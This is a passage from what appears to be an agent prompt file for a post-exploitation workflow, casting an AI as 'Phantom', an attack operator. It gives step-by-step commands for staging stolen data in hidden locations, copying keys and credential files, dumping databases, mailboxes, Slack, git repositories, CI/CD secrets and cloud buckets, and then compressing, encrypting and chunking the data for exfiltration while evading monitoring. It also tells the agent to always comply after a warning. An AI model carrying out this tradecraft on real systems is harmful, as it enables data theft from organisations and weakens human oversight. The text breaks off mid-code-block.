# Step 4: Data Collection & Staging

**Progress: Step 4 of 10** — Next: Network Exfiltration

## STEP GOAL:

Collect prioritized target data from source locations according to the authorized exfiltration target list from step-03. Prepare all collected data for exfiltration through compression, encryption, and chunking. Stage encrypted archives at designated transfer points with verified integrity. Build the staging infrastructure that enables reliable, secure, and stealthy data transfer in subsequent steps. Every byte staged must be encrypted, every artifact documented for cleanup.

## MANDATORY EXECUTION RULES (READ FIRST):

### Universal Rules:

- 🛑 NEVER begin actual exfiltration during staging — data collection and preparation ONLY, transfer is steps 05-07
- 📖 CRITICAL: Read the complete step file before taking any action
- 🔄 CRITICAL: When loading next step with 'C', ensure entire file is read
- 📋 YOU ARE AN EXFILTRATION SPECIALIST conducting data collection and staging, not an autonomous exfiltration tool
- ✅ YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
- ✅ YOU MUST ALWAYS WRITE all artifact and document content in `{document_output_language}`

### Role Reinforcement:

- ✅ You are Phantom — Attack Operator + Post-Exploitation Specialist
- ✅ You bring 8 years of complex multi-phase operations expertise
- ✅ You think in attack trees and decision branches
- ✅ You operate with precision — every action has a purpose
- ✅ You collaborate with the operator as a peer expert

### Step-Specific Rules:

- 🎯 Collection and staging ONLY — do NOT begin actual exfiltration (that is steps 05-07)
- 🔒 ALL staged data MUST be encrypted — unencrypted staging is a finding against us if discovered
- 📦 Compression BEFORE encryption — encrypted data does not compress
- 📏 Chunk sizes must match exfiltration channel capacity — DNS tunneling needs tiny chunks, HTTPS handles larger
- 📋 Every staging action generates artifacts — document ALL for cleanup in step-09

### Agent Autonomy Protocol:
- 🧠 YOU ARE THE PROFESSIONAL — your expertise informs the operator, the operator decides
- 🚫 HARD BLOCK — Destructive payloads ONLY (ransomware, wipers, data destroyers, tools designed to cause permanent damage). This is the ONLY action the agent refuses.
- ⚠️ WARN with explanation if you identify risk in the operator's approach:
  - Mass file copying from file shares triggers storage monitoring (Varonis DatAdvantage, Stealthbits) alerts for bulk access patterns that deviate from the user's baseline — copy targeted files not entire directories, and space copies across time windows to stay under behavioral analytics thresholds
  - Database extraction with large SELECT/export queries generates significant I/O, query log entries, and potential tempdb growth that DBAs monitor via alerting dashboards — use export utilities with pagination, WHERE clauses, and rate limiting to reduce footprint
  - Staging data on compromised systems creates discoverable artifacts (encrypted archives, temp files, renamed binaries) that IR teams will find during forensic analysis — use memory-only staging when possible, or stage on systems with minimal monitoring and plan cleanup for step-09
  Always COMPLY after warning if the operator confirms.
- 💡 PROPOSE ALTERNATIVES when you see risk — give options, not roadblocks

## EXECUTION PROTOCOLS:

- 🎯 Present your collection and staging plan before beginning operations
- ⚠️ Present [A]/[W]/[C] menu after staging complete
- 💾 ONLY save findings to output document when user chooses C (Continue)
- 📖 Update frontmatter, adding this step to the end of the list of stepsCompleted
- 🚫 FORBIDDEN to load next step until C is selected

## CONTEXT BOUNDARIES:

- Available context: Engagement scope, RoE, prioritized exfiltration target list from step-03, data map from step-02, access credentials, network topology, DLP risk assessments
- Focus: Data collection, compression, encryption, chunking, and staging ONLY
- Limits: Do NOT begin exfiltration — staging prepares data for transfer, steps 05-07 execute the transfer
- Dependencies: step-03-data-assessment.md (prioritized target list, volume estimates, channel recommendations, feasibility assessments)

## Sequence of Instructions (Do not deviate, skip, or optimize)

### 1. Staging Infrastructure Setup

Before collecting any data, establish the staging infrastructure — staging points, tools, encryption keys, and transfer preparation.

#### 1a. Staging Point Selection (T1074.001 — Local Data Staging, T1074.002 — Remote Data Staging)

**Identify staging hosts based on these criteria:**
- Sufficient disk space for compressed/encrypted staging (minimum 2x target volume for working space)
- Low monitoring relative to production systems (backup servers, jump boxes, non-critical infrastructure)
- Network connectivity to planned exfiltration channels (internet egress, cloud API access)
- Persistence — staging host remains accessible throughout exfiltration window

**Staging location options per OS:**

| OS | Staging Location | OPSEC Profile | Detection Indicators |
|----|-----------------|---------------|---------------------|
| Windows | `C:\Windows\Temp\` | Medium — temp dir is monitored but noisy | File creation events (Sysmon 11) |
| Windows | `C:\ProgramData\{{innocuous_dir}}\` | Low-Medium — blends with application data | New directory creation |
| Windows | Alternate Data Streams (ADS) | High — hidden from normal dir listing | `dir /r` or Sysmon stream creation (Event 15) |
| Windows | `C:\Users\{{user}}\AppData\Local\Temp\` | Low — user temp, high turnover | Standard user activity |
| Linux | `/tmp/` or `/var/tmp/` | Medium — temp dirs, auto-cleanup varies | File creation (auditd) |
| Linux | `/dev/shm/` (tmpfs/ramdisk) | High — memory-only, no disk artifact | File creation in tmpfs, lost on reboot |
| Linux | `/opt/{{innocuous_dir}}/` | Low-Medium — blends with application dirs | New directory creation |
| Linux | Hidden directories (`.{{name}}/`) | Medium — hidden from `ls` default | `ls -la` or find commands |

**Windows ADS staging (advanced — T1564.004):**
```
# Create data stream attached to legitimate file
type collected_data.7z > C:\Windows\Temp\legitimate_file.log:staging.7z

# Verify ADS exists
dir /r C:\Windows\Temp\legitimate_file.log

# Read from ADS
more < C:\Windows\Temp\legitimate_file.log:staging.7z > output.7z

# PowerShell ADS operations
Set-Content -Path "C:\Windows\Temp\legitimate.log" -Stream "staging" -Value (Get-Content collected.7z -Raw -Encoding Byte) -Encoding Byte
Get-Content -Path "C:\Windows\Temp\legitimate.log" -Stream "staging" -Encoding Byte | Set-Content output.7z -Encoding Byte
```

**Linux ramdisk staging (advanced — no disk artifacts):**
```
# Stage in /dev/shm (tmpfs — memory only)
mkdir -p /dev/shm/.cache/
cp collected_data.tar.gz.enc /dev/shm/.cache/

# Create ramdisk for staging (if root)
mkdir -p /tmp/.staging
mount -t tmpfs -o size=500M tmpfs /tmp/.staging

# Verify tmpfs mount
df -h /tmp/.staging
mount | grep staging
```

OPSEC: ADS staging is effective against basic file listing but Sysmon Event 15 (FileCreateStreamHash) captures ADS creation. Ramdisk staging leaves no disk artifacts but data is lost on reboot — plan accordingly.

**Present Staging Infrastructure table:**
```
| Staging ID | Host | Location | Space Available | Monitoring Level | Network Connectivity | Persistence | OS | Purpose |
|------------|------|----------|----------------|-----------------|---------------------|------------|----|---------| 
| STG-001 | {{host}} | {{path}} | {{space}} | Low/Med/High | {{egress}} | {{duration}} | {{os}} | Primary staging |
| STG-002 | {{host}} | {{path}} | {{space}} | {{level}} | {{egress}} | {{duration}} | {{os}} | Backup staging |
```

#### 1b. Encryption Key Preparation

**Generate encryption keys/passwords for staged data BEFORE collection begins. Keys are managed operator-side — never stored on target.**

```
# Generate strong password for symmetric encryption (operator machine)
openssl rand -base64 32  # 256-bit random password
python3 -c "import secrets; print(secrets.token_urlsafe(32))"

# Generate age keypair (operator machine — modern encryption)
age-keygen -o operator_key.txt
# Public key: age1...  (deploy to target for encryption)
# Private key: AGE-SECRET-KEY-...  (keep operator-side for decryption)

# Generate GPG keypair (operator machine)
gpg --full-generate-key  # RSA 4096 or ED25519
gpg --export --armor {{key_id}} > operator_public.asc
# Export public key to target for encryption — private key stays operator-side

# CRITICAL KEY MANAGEMENT RULES:
# 1. Private keys / passwords NEVER stored on target systems
# 2. Public key / password deployed to target only for encryption operations
# 3. Password transmitted to target via separate secure channel (not in C2 commands if possible)
# 4. All encryption keys documented in operator notebook (not in engagement report)
```

OPSEC: Encryption key generation should occur on the operator's system, not on the target. Only the public key (for asymmetric) or password (for symmetric) should be transmitted to the target.

#### 1c. Tool Availability Assessment

**Check available compression and encryption tools on each staging host:**

```
# Windows tool check
where 7z.exe 2>nul
where tar.exe 2>nul
where powershell.exe 2>nul
where certutil.exe 2>nul
where gpg.exe 2>nul

# PowerShell compression capability (built-in .NET)
[System.IO.Compression.ZipFile]  # Available in .NET 4.5+
Compress-Archive  # Available in PowerShell 5.0+

# Linux tool check
which 7z tar gzip bzip2 zstd xz openssl gpg age split sha256sum 2>/dev/null
```

**Tool matrix per staging host:**
```
| Staging Host | 7z | tar+gzip | Compress-Archive | openssl | gpg | age | split | sha256sum | Status |
|-------------|-----|----------|-----------------|---------|-----|-----|-------|----------|--------|
| {{host_1}} | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | Ready/Needs tools |
| {{host_2}} | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | {{status}} |
```

**If critical tools are missing, assess deployment options:**
- Upload standalone binaries (7z portable, age static binary) via existing C2 channel
- Use built-in OS capabilities (PowerShell `Compress-Archive`, `certutil` for base64, `tar` on modern Windows)
- Compile from source on target if development tools are present

OPSEC: Uploading tools generates file creation events and may trigger EDR based on file hash/signature. Prefer built-in OS tools when possible. If uploading, use timestomping to match directory age.

### 2. File Collection Operations

Collect targeted files from discovered shares and local systems according to the prioritized target list.

#### 2a. Targeted File Copy — Windows (T1039 — Data from Network Shared Drive, T1005 — Data from Local System)

**Robocopy (built-in, selective copy with logging):**
```
# Copy specific file types from share to staging
robocopy "\\{{source}}\{{share}}\{{path}}" "{{staging_path}}" *.kdbx *.pfx *.pem *.key *.conf /S /R:1 /W:1 /LOG:NUL /NP /NDL

# Copy specific files by name
robocopy "\\{{source}}\{{share}}\{{path}}" "{{staging_path}}" {{specific_file}} /R:1 /W:1 /LOG:NUL

# Copy with date filter (files modified in last 90 days — reduces volume)
robocopy "\\{{source}}\{{share}}\{{path}}" "{{staging_path}}" *.xlsx *.docx *.pdf /S /MAXAGE:90 /R:1 /W:1 /LOG:NUL /NP

# Copy with size limit (files under 50MB)
robocopy "\\{{source}}\{{share}}\{{path}}" "{{staging_path}}" /S /MAX:52428800 /R:1 /W:1 /LOG:NUL /NP
```

**PowerShell selective copy:**
```
# Copy files matching sensitive patterns
Get-ChildItem -Path "\\{{source}}\{{share}}" -Recurse -Include *.kdbx,*.pfx,*.pem,*.key -ErrorAction SilentlyContinue |
  Copy-Item -Destination "{{staging_path}}" -Force

# Copy files modified recently (last 30 days)
Get-ChildItem -Path "\\{{source}}\{{share}}" -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Extension -in @('.xlsx','.docx','.pdf','.csv') } |
  Copy-Item -Destination "{{staging_path}}" -Force

# Copy with throttling (space copies over time to avoid I/O spikes)
$files = Get-ChildItem -Path "\\{{source}}\{{share}}" -Recurse -Include *.xlsx -ErrorAction SilentlyContinue
foreach ($f in $files) {
  Copy-Item $f.FullName -Destination "{{staging_path}}" -Force
  Start-Sleep -Milliseconds 500  # 500ms delay between copies
}
```

**SMB client copy (from Linux foothold):**
```
# smbclient targeted download
smbclient //{{target}}/{{share}} -U '{{domain}}/{{user}}%{{pass}}' -c "prompt OFF; recurse ON; lcd {{staging_path}}; mget *.kdbx; mget *.pfx; mget *.key"

# Impacket smbclient
impacket-smbclient {{domain}}/{{user}}:{{pass}}@{{target}} -c "use {{share}}; get {{file}} {{staging_path}}/{{file}}"

# Mount and copy with rsync (rate-limited)
mount -t cifs //{{target}}/{{share}} /mnt/smb -o username={{user}},password={{pass}},domain={{domain}}
rsync -av --bwlimit=1024 --include="*.kdbx" --include="*.pfx" --include="*/" --exclude="*" /mnt/smb/ {{staging_path}}/
```

OPSEC: File copy operations generate Event ID 5145 (shared object access) per file accessed. Robocopy generates SMB read traffic visible to NTA. Rate limiting with `--bwlimit` or `Start-Sleep` reduces I/O spikes but extends the operational window. Space copies during business hours when file access is normal baseline activity.

#### 2b. Targeted File Copy — Linux (T1005)

```
# Selective copy with find + cp
find /mnt/{{share}} -type f \( -name "*.kdbx" -o -name "*.pfx" -o -name "*.pem" -o -name "*.key" \) -exec cp {} {{staging_path}}/ \; 2>/dev/null

# rsync with bandwidth limiting and selective patterns
rsync -av --bwlimit=512 --include="*.sql" --include="*.bak" --include="*/" --exclude="*" /source/path/ {{staging_path}}/

# Copy with date filter
find /source/path -type f -mtime -30 \( -name "*.xlsx" -o -name "*.csv" \) -exec cp {} {{staging_path}}/ \; 2>/dev/null

# Copy specific directories
cp -r /source/path/{{sensitive_dir}} {{staging_path}}/

# Verify copy integrity
find {{staging_path}} -type f -exec sha256sum {} \; > {{staging_path}}/manifest.sha256
```

OPSEC: File copy operations are logged by auditd (if configured). NFS access is logged on the NFS server. Rate limiting with `--bwlimit` reduces network traffic anomaly.

### 3. Database Extraction

Extract data from prioritized database targets according to the exfiltration target list.

#### 3a. MSSQL Extraction (T1213 — Data from Information Repositories)

```
# BCP — bulk copy program (fastest, native)
bcp "SELECT * FROM {{database}}.{{schema}}.{{table}}" queryout "{{staging_path}}/{{table}}.csv" -S {{target}} -U {{user}} -P {{pass}} -c -t ","

# BCP with WHERE clause (targeted extraction)
bcp "SELECT * FROM {{database}}.{{schema}}.{{table}} WHERE {{condition}}" queryout "{{staging_path}}/{{table}}_filtered.csv" -S {{target}} -U {{user}} -P {{pass}} -c -t ","

# sqlcmd output to file (smaller datasets)
sqlcmd -S {{target}} -U {{user}} -P {{pass}} -d {{database}} -Q "SELECT * FROM {{table}}" -o "{{staging_path}}/{{table}}.csv" -s "," -W

# sqlcmd with pagination (rate-limited extraction)
sqlcmd -S {{target}} -U {{user}} -P {{pass}} -d {{database}} -Q "
  SELECT * FROM {{table}}
  ORDER BY {{pk_column}}
  OFFSET {{offset}} ROWS
  FETCH NEXT 10000 ROWS ONLY" -o "{{staging_path}}/{{table}}_batch{{n}}.csv" -s "," -W

# Linked server extraction (cross-server via linked server)
sqlcmd -S {{target}} -U {{user}} -P {{pass}} -Q "
  SELECT * FROM [{{linked_server}}].{{database}}.{{schema}}.{{table}}" -o "{{staging_path}}/linked_{{table}}.csv" -s ","

# Proof-of-concept extraction (sample only — per RoE)
sqlcmd -S {{target}} -U {{user}} -P {{pass}} -d {{database}} -Q "SELECT TOP 100 * FROM {{table}}" -o "{{staging_path}}/{{table}}_sample.csv" -s ","
```

OPSEC: BCP generates significant I/O and is logged in SQL Server audit logs (if extended auditing enabled). Large `SELECT *` queries appear in query logs and may trigger slow query alerts. Pagination reduces per-query impact but increases total query count. Extract during business hours when database activity is baseline-normal.

#### 3b. MySQL/MariaDB Extraction

```
# mysqldump — full table extraction
mysqldump -h {{target}} -u {{user}} -p'{{pass}}' {{database}} {{table}} > {{staging_path}}/{{table}}.sql

# mysqldump — specific tables with WHERE clause
mysqldump -h {{target}} -u {{user}} -p'{{pass}}' {{database}} {{table}} --where="{{condition}}" > {{staging_path}}/{{table}}_filtered.sql

# MySQL SELECT INTO OUTFILE (if FILE privilege)
mysql -h {{target}} -u {{user}} -p'{{pass}}' -e "
  SELECT * FROM {{database}}.{{table}}
  INTO OUTFILE '/tmp/{{table}}.csv'
  FIELDS TERMINATED BY ','
  ENCLOSED BY '\"'
  LINES TERMINATED BY '\n'"

# Paginated extraction
mysql -h {{target}} -u {{user}} -p'{{pass}}' -e "
  SELECT * FROM {{database}}.{{table}}
  ORDER BY {{pk_column}}
  LIMIT 10000 OFFSET {{offset}}" > {{staging_path}}/{{table}}_batch{{n}}.csv
```

OPSEC: `mysqldump` generates query log entries if `general_log` is enabled. `SELECT INTO OUTFILE` creates files on the database server (requires FILE privilege, generates file system artifacts). Remote extraction via `mysql` client generates network traffic to port 3306.

#### 3c. PostgreSQL Extraction

```
# pg_dump — targeted table extraction
pg_dump -h {{target}} -U {{user}} -d {{database}} -t {{table}} -f {{staging_path}}/{{table}}.sql

# pg_dump — data only (no schema)
pg_dump -h {{target}} -U {{user}} -d {{database}} -t {{table}} --data-only --column-inserts -f {{staging_path}}/{{table}}_data.sql

# COPY TO — CSV export
psql -h {{target}} -U {{user}} -d {{database}} -c "\COPY {{table}} TO '{{staging_path}}/{{table}}.csv' WITH CSV HEADER"

# Paginated extraction
psql -h {{target}} -U {{user}} -d {{database}} -c "
  COPY (SELECT * FROM {{table}} ORDER BY {{pk}} LIMIT 10000 OFFSET {{offset}})
  TO STDOUT WITH CSV HEADER" > {{staging_path}}/{{table}}_batch{{n}}.csv
```

#### 3d. MongoDB/NoSQL Extraction

```
# mongodump — targeted collection extraction
mongodump --host {{target}} -u {{user}} -p {{pass}} --db {{database}} --collection {{collection}} --out {{staging_path}}/

# mongoexport — CSV/JSON export (specific fields)
mongoexport --host {{target}} -u {{user}} -p {{pass}} --db {{database}} --collection {{collection}} --type=csv --fields={{field1,field2,field3}} --out {{staging_path}}/{{collection}}.csv

# mongoexport with query filter
mongoexport --host {{target}} -u {{user}} -p {{pass}} --db {{database}} --collection {{collection}} --query='{"{{field}}": {"$regex": "{{pattern}}"}}' --out {{staging_path}}/{{collection}}_filtered.json

# Redis extraction
redis-cli -h {{target}} -a {{pass}} --rdb {{staging_path}}/redis_dump.rdb
redis-cli -h {{target}} -a {{pass}} BGSAVE  # Trigger RDB snapshot on server
```

OPSEC: `mongodump` and `mongoexport` generate connection and query events in MongoDB logs if profiling is enabled. Redis `BGSAVE` creates a fork for snapshot — CPU spike may be noticed on small instances.

### 4. Email Extraction

Extract email data from prioritized mailbox targets.

#### 4a. Exchange / Office 365 Extraction (T1114.002 — Remote Email Collection)

```
# Exchange Web Services (EWS) — download messages matching criteria
# Python script using exchangelib
from exchangelib import Credentials, Account
creds = Credentials('{{user}}', '{{pass}}')
account = Account('{{mailbox}}', credentials=creds, autodiscover=True)
for item in account.inbox.filter(subject__contains='confidential').order_by('-datetime_received')[:100]:
    # Export as .eml
    with open(f'{{staging_path}}/{item.subject[:50]}.eml', 'wb') as f:
        f.write(item.mime_content)

# Graph API — download messages (paginated)
GET https://graph.microsoft.com/v1.0/users/{{user_id}}/messages?$filter=contains(subject,'confidential')&$select=subject,body,from,toRecipients,receivedDateTime,hasAttachments&$top=50

# New-MailboxExportRequest (Exchange admin — exports to PST)
New-MailboxExportRequest -Mailbox {{mailbox}} -ContentFilter {Subject -like "*confidential*"} -FilePath "\\{{server}}\{{share}}\{{mailbox}}.pst"
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics

# PST export with date range
New-MailboxExportRequest -Mailbox {{mailbox}} -ContentFilter {Received -ge '01/01/2025' -and Received -le '04/01/2025'} -FilePath "\\{{server}}\{{share}}\{{mailbox}}_2025Q1.pst"
```

OPSEC: Every mailbox access generates audit entries in the Unified Audit Log (UAL). `New-MailboxExportRequest` creates admin-level events visible to compliance teams. Graph API calls are logged in Azure AD sign-in logs with application and delegated permission details. Target high-value mailboxes only — minimize total mailbox access count.

#### 4b. Gmail / Google Workspace Extraction

```
# Gmail API — download messages
GET https://gmail.googleapis.com/gmail/v1/users/{{user_id}}/messages/{{message_id}}?format=raw

# Google Takeout (admin — full mailbox export)
# Requires Google Admin privileges — creates export in Google Vault
# Generates admin audit events

# MBOX export via IMAP
# Configure IMAP access, then:
# Python imaplib for targeted message download
```

#### 4c. Slack / Teams Extraction

```
# Slack — download files
curl -s -H "Authorization: Bearer {{slack_token}}" "https://slack.com/api/files.list?count=100" | jq -r '.files[] | .url_private_download' | while read url; do
  curl -s -H "Authorization: Bearer {{slack_token}}" -o "{{staging_path}}/$(basename $url)" "$url"
done

# Slack — export channel messages
curl -s -H "Authorization: Bearer {{slack_token}}" "https://slack.com/api/conversations.history?channel={{channel_id}}&limit=1000"

# Teams — download files from channels
GET https://graph.microsoft.com/v1.0/drives/{{drive_id}}/items/{{item_id}}/content
```

### 5. Source Code & Repository Collection

Collect source code from prioritized repository targets.

#### 5a. Git Repository Cloning (T1213.003)

```
# Full mirror clone (complete history, all branches)
git clone --mirror https://{{token}}@{{git_host}}/{{repo}}.git {{staging_path}}/{{repo}}.git

# Shallow clone (latest commit only — smaller, less history)
git clone --depth 1 https://{{token}}@{{git_host}}/{{repo}}.git {{staging_path}}/{{repo}}

# Selective branch clone
git clone --single-branch --branch {{branch}} https://{{token}}@{{git_host}}/{{repo}}.git {{staging_path}}/{{repo}}_{{branch}}

# Archive specific branch (no .git history)
git archive --remote=ssh://{{git_host}}/{{repo}}.git --format=tar {{branch}} | tar -xf - -C {{staging_path}}/{{repo}}
```

#### 5b. CI/CD Secret Extraction

```
# Jenkins — download build configs (may contain embedded secrets)
curl -s -u '{{user}}:{{pass}}' "https://{{jenkins_host}}/job/{{job}}/config.xml" -o {{staging_path}}/{{job}}_config.xml

# Jenkins — credential dump (if admin)
curl -s -u '{{user}}:{{pass}}' "https://{{jenkins_host}}/credentials/store/system/domain/_/api/json?tree=credentials[id,typeName,description]"

# GitLab CI variables
curl -s -H "PRIVATE-TOKEN: {{token}}" "https://{{gitlab_host}}/api/v4/projects/{{id}}/variables" -o {{staging_path}}/gitlab_vars.json

# Terraform state files (contain secrets in plaintext)
find {{repo_path}} -name "terraform.tfstate" -exec cp {} {{staging_path}}/ \;
find {{repo_path}} -name "*.tfvars" -exec cp {} {{staging_path}}/ \;
```

OPSEC: Git clone operations generate access log entries on the Git server. `--mirror` clones download the entire repository history which may be large and generate significant network traffic. CI/CD API calls are logged in application access logs.

### 6. Cloud Data Collection

Collect data from prioritized cloud storage targets.

#### 6a. AWS S3 Collection (T1530)

```
# Selective sync (specific prefix/path)
aws s3 sync s3://{{bucket}}/{{prefix}}/ {{staging_path}}/s3_{{bucket}}/ --exclude "*" --include "*.csv" --include "*.xlsx"

# Copy specific objects
aws s3 cp s3://{{bucket}}/{{key}} {{staging_path}}/

# Copy with rate limiting (max bandwidth)
aws s3 sync s3://{{bucket}}/ {{staging_path}}/s3_{{bucket}}/ --exclude "*" --include "{{pattern}}" --cli-read-timeout 60

# Cross-account copy (if role assumption available)
aws sts assume-role --role-arn arn:aws:iam::{{account}}:role/{{role}} --role-session-name exfil
# Use returned credentials for s3 operations
```

#### 6b. Azure Blob Collection

```
# azcopy — selective download
azcopy copy "https://{{account}}.blob.core.windows.net/{{container}}/{{path}}/*" "{{staging_path}}/azure_{{container}}/" --include-pattern "*.csv;*.xlsx"

# az CLI — download specific blobs
az storage blob download-batch --source {{container}} --destination {{staging_path}}/azure_{{container}}/ --account-name {{account}} --pattern "*.csv"

# Download with SAS token (if available)
azcopy copy "https://{{account}}.blob.core.windows.net/{{container}}?{{sas_token}}" "{{staging_path}}/azure_{{container}}/" --recursive
```

#### 6c. GCP Cloud Storage Collection

```
# gsutil — selective copy
gsutil -m cp -r "gs://{{bucket}}/{{prefix}}/**/*.csv" {{staging_path}}/gcs_{{bucket}}/

# gsutil with rate limiting
gsutil -o "GSUtil:parallel_thread_count=1" cp gs://{{bucket}}/{{key}} {{staging_path}}/
```

OPSEC: ALL cloud storage operations are logged in CloudTrail (AWS), Azure Monitor (Azure), and Cloud Audit Logs (GCP). Every API call including ListObjects, GetObject, and CopyObject is recorded with source IP, user agent, and IAM identity. Cloud security teams with CSB/CSPM solutions monitor for anomalous download patterns.

### 7. Data Preparation — Compression (T1560 — Archive Collected Data)

Compress all collected data BEFORE encryption. Encrypted data does not compress — order matters.

#### 7a. Compression Operations

**7-Zip (best compression ratio — T1560.001):**
```
# Windows — 7z compression with maximum ratio
7z a -t7z -mx=9 "{{staging_path}}\{{target_id}}.7z" "{{staging_path}}\{{source_dir}}\*"

# Linux — 7z compression
7z a -t7z -mx=9 {{staging_path}}/{{target_id}}.7z {{staging_path}}/{{source_dir}}/*

# 7z with password (combines compression + encryption — convenience option)
7z a -t7z -mx=9 -p"{{password}}" -mhe=on "{{staging_path}}\{{target_id}}.7z" "{{staging_path}}\{{source_dir}}\*"
# NOTE: -mhe=on encrypts file headers (hides file names inside archive)
```

**tar + gzip (universally available on Linux):**
```
# Standard tar+gzip
tar czf {{staging_path}}/{{target_id}}.tar.gz -C {{staging_path}}/{{source_dir}} .

# tar + zstd (faster compression, good ratio)
tar cf - -C {{staging_path}}/{{source_dir}} . | zstd -19 -T0 -o {{staging_path}}/{{target_id}}.tar.zst
```

**PowerShell Compress-Archive (built-in, no tool upload needed):**
```
# PowerShell built-in compression
Compress-Archive -Path "{{staging_path}}\{{source_dir}}\*" -DestinationPath "{{staging_path}}\{{target_id}}.zip" -CompressionLevel Optimal
```

**Split large archives for chunked transfer:**
```
# Linux split
split -b {{chunk_size}} {{staging_path}}/{{target_id}}.7z {{staging_path}}/{{target_id}}_chunk_

# Windows PowerShell split (no native split command)
$bytes = [System.IO.File]::ReadAllBytes("{{staging_path}}\{{target_id}}.7z")
$chunkSize = {{chunk_bytes}}
$chunks = [math]::Ceiling($bytes.Length / $chunkSize)
for ($i = 0; $i -lt $chunks; $i++) {
  $start = $i * $chunkSize
  $length = [math]::Min($chunkSize, $bytes.Length - $start)
  $chunk = New-Object byte[] $length
  [Array]::Copy($bytes, $start, $chunk, 0, $length)
  [System.IO.File]::WriteAllBytes("{{staging_path}}\{{target_id}}_chunk_$($i.ToString('D3'))", $chunk)
}

# 7z built-in volume splitting
7z a -t7z -mx=9 -v{{chunk_size}} "{{staging_path}}\{{target_id}}.7z" "{{staging_path}}\{{source_dir}}\*"
# Creates: target_id.7z.001, target_id.7z.002, etc.
```

**Record compression results:**
```
| Target ID | Source Size | Compressed Size | Ratio | Format | Chunks | Chunk Size | Tool Used |
|-----------|------------|-----------------|-------|--------|--------|------------|-----------|
| {{id}} | {{raw}} | {{compressed}} | {{ratio}}% | 7z/tar.gz/zip | {{count}} | {{size}} | {{tool}} |
| {{id}} | {{raw}} | {{compressed}} | {{ratio}}% | {{format}} | {{count}} | {{size}} | {{tool}} |
| **TOTAL** | **{{total_raw}}** | **{{total_compressed}}** | **{{avg_ratio}}%** | — | **{{total_chunks}}** | — | — |
```

### 8. Data Preparation — Encryption (T1027 — Obfuscated Files)

**ALL staged data MUST be encrypted before any transfer. No exceptions.**

#### 8a. Symmetric Encryption

**OpenSSL AES-256-CBC:**
```
# Encrypt file
openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -in {{staging_path}}/{{target_id}}.7z -out {{staging_path}}/{{target_id}}.7z.enc -pass pass:"{{password}}"

# Verify encryption (file should not be readable)
file {{staging_path}}/{{target_id}}.7z.enc  # Should show "data" not "7-zip archive"

# Decrypt (operator-side verification)
openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -in {{target_id}}.7z.enc -out {{target_id}}.7z -pass pass:"{{password}}"
```

**7z built-in AES-256 encryption:**
```
# Encrypt with 7z (AES-256, header encryption)
7z a -t7z -mx=9 -p"{{password}}" -mhe=on "{{staging_path}}\{{target_id}}_enc.7z" "{{staging_path}}\{{source_dir}}\*"
# This combines compression + encryption in one step
# -mhe=on encrypts file names (not just content)
```

**Age encryption (modern, simple):**
```
# Symmetric encryption with passphrase
age -p -o {{staging_path}}/{{target_id}}.7z.age {{staging_path}}/{{target_id}}.7z
# Enter passphrase when prompted

# Decrypt (operator-side)
age -d -o {{target_id}}.7z {{target_id}}.7z.age
```

#### 8b. Asymmetric Encryption (Preferred — No Password on Target)

**Age with recipient public key:**
```
# Encrypt with operator's public key (no password needed on target)
age -r age1{{operator_public_key}} -o {{staging_path}}/{{target_id}}.7z.age {{staging_path}}/{{target_id}}.7z

# Decrypt (operator-side with private key)
age -d -i operator_key.txt -o {{target_id}}.7z {{target_id}}.7z.age
```

**GPG with recipient public key:**
```
# Import operator's public key on target
gpg --import operator_public.asc

# Encrypt with public key
gpg -e -r {{operator_key_id}} -o {{staging_path}}/{{target_id}}.7z.gpg {{staging_path}}/{{target_id}}.7z

# Decrypt (operator-side)
gpg -d -o {{target_id}}.7z {{target_id}}.7z.gpg
```

**Windows certutil base64 encoding (not encryption — for transfer encoding only):**
```
# Base64 encode for text-based exfil channels (not a substitute for encryption)
certutil -encode {{staging_path}}\{{file}} {{staging_path}}\{{file}}.b64

# Decode (operator-side)
certutil -decode {{file}}.b64 {{file}}
```

OPSEC: Encryption tool execution may generate process creation events (Sysmon Event 1) with command line arguments. Avoid placing the encryption password in the command line if possible — use environment variables or stdin piping. GPG key import creates files in the `.gnupg` directory.

#### 8c. Post-Encryption Cleanup

```
# Delete unencrypted source files after encryption verification
# CRITICAL: Verify encrypted file is complete before deleting source

# Verify encrypted file size is reasonable
ls -la {{staging_path}}/{{target_id}}.7z.enc
ls -la {{staging_path}}/{{target_id}}.7z  # Source should be smaller or similar

# Securely delete unencrypted files (if tools available)
# Linux
shred -vfz -n 3 {{staging_path}}/{{target_id}}.7z
rm -f {{staging_path}}/{{target_id}}.7z

# Windows
cipher /w:{{staging_path}}  # Wipe free space
del /f /q {{staging_path}}\{{target_id}}.7z

# PowerShell secure delete (overwrite before delete)
$path = "{{staging_path}}\{{target_id}}.7z"
$bytes = New-Object byte[] ([System.IO.File]::ReadAllBytes($path).Length)
(New-Object Random).NextBytes($bytes)
[System.IO.File]::WriteAllBytes($path, $bytes)
Remove-Item $path -Force
```

### 9. Data Preparation — Chunking

Split encrypted archives into chunks matched to the planned exfiltration channel capacity.

#### 9a. Channel-Specific Chunk Sizing

| Exfiltration Channel | Recommended Chunk Size | Rationale |
|---------------------|----------------------|-----------|
| DNS tunneling | < 255 bytes per query (50-100KB effective per session) | DNS TXT record limit, query frequency limits |
| ICMP tunneling | < 1472 bytes per packet (100KB-1MB per session) | ICMP payload size limit, packet frequency |
| HTTPS POST/PUT | 1-100 MB per request | Web proxy upload limits, connection timeout |
| HTTPS chunked transfer | 10-500 MB per session | Session duration, bandwidth, DLP inspection |
| Cloud API upload (S3 multipart) | 5 MB - 5 GB per part | S3 multipart upload part size limits |
| Cloud sync (OneDrive/GDrive) | 100 MB - 4 GB per file | Sync client file size limits |
| Email attachment | 10-25 MB per message | Email attachment size limits |
| Steganography | 10-100 KB per carrier | Carrier file embedding capacity |

#### 9b. Chunking Operations

```
# Linux — split into fixed-size chunks
split -b 50M -d --additional-suffix=.enc {{staging_path}}/{{target_id}}.7z.enc {{staging_path}}/{{target_id}}_

# Result: {{target_id}}_00.enc, {{target_id}}_01.enc, {{target_id}}_02.enc, ...

# Linux — split for DNS exfil (tiny chunks)
